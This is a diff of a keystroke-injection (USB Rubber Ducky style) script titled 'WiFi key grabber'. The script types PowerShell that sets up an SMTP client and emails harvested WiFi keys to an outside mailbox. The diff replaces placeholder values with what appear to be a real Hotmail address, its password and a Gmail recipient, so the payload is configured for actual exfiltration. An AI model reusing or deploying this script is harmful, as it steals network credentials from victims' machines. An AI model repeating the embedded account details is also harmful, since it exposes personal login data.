@@ -51,13 +51,13 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSSL = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@hotmail.com', 'PASSWORD')
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('cacao_0777@hotmail.com', 'kelvin777')
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
-STRING $ReportEmail.From = 'ACCOUNT@hotmail.com'
+STRING $ReportEmail.From = 'cacao_0777@hotmail.com'
 ENTER
-STRING $ReportEmail.To.Add('RECEIVER@any.com')
+STRING $ReportEmail.To.Add('rmarias090@gmail.com')
 ENTER
 STRING $ReportEmail.Subject = 'WiFi key grabber'
 ENTER
